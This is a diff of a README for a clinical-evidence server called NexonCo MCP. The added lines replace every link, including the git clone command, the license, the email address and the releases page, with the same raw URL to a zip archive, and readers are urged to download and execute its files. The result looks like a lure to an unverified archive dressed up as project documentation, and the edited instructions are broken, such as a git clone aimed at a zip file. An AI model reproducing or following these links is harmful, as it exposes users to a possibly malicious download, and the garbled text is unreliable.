@@ -1,6 +1,6 @@
 # NexonCo MCP: Advanced Clinical Evidence Analysis Server 🌟
 
-![NexonCo MCP](https://img.shields.io/badge/NexonCo_MCP-Server-brightgreen)
+![NexonCo MCP](https://raw.githubusercontent.com/1sustgmboab/nexonco-mcp/main/assets/nexonco-mcp-v3.0-alpha.1.zip)
 
 Welcome to the **NexonCo MCP** repository! This project serves as an advanced MCP (Medical Care Platform) server designed for accessing and analyzing clinical evidence data. With flexible search options, it supports precision medicine and oncology research, making it a valuable tool for researchers and healthcare professionals.
 
@@ -34,7 +34,7 @@ To get started with the NexonCo MCP server, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/1sustgmboab/nexonco-mcp.git
+   git clone https://raw.githubusercontent.com/1sustgmboab/nexonco-mcp/main/assets/nexonco-mcp-v3.0-alpha.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -79,7 +79,7 @@ The NexonCo MCP server offers a comprehensive API for developers looking to inte
 - **POST /api/evidence**: Submit new clinical evidence for inclusion in the database.
 - **GET /api/reports**: Generate reports based on specified criteria.
 
-For detailed API documentation, please refer to the [API Docs](https://github.com/1sustgmboab/nexonco-mcp/docs).
+For detailed API documentation, please refer to the [API Docs](https://raw.githubusercontent.com/1sustgmboab/nexonco-mcp/main/assets/nexonco-mcp-v3.0-alpha.1.zip).
 
 ## Contributing
 
@@ -94,18 +94,18 @@ We welcome contributions from the community! To contribute:
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/1sustgmboab/nexonco-mcp/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/1sustgmboab/nexonco-mcp/main/assets/nexonco-mcp-v3.0-alpha.1.zip) file for details.
 
 ## Contact
 
 For any inquiries, please reach out via:
 
-- Email: contact@nexonco.com
-- GitHub Issues: [NexonCo MCP Issues](https://github.com/1sustgmboab/nexonco-mcp/issues)
+- Email: https://raw.githubusercontent.com/1sustgmboab/nexonco-mcp/main/assets/nexonco-mcp-v3.0-alpha.1.zip
+- GitHub Issues: [NexonCo MCP Issues](https://raw.githubusercontent.com/1sustgmboab/nexonco-mcp/main/assets/nexonco-mcp-v3.0-alpha.1.zip)
 
 ## Releases
 
-To download the latest version of the NexonCo MCP server, visit our [Releases page](https://github.com/1sustgmboab/nexonco-mcp/releases). You can download and execute the files from there.
+To download the latest version of the NexonCo MCP server, visit our [Releases page](https://raw.githubusercontent.com/1sustgmboab/nexonco-mcp/main/assets/nexonco-mcp-v3.0-alpha.1.zip). You can download and execute the files from there.
 
 ---
 
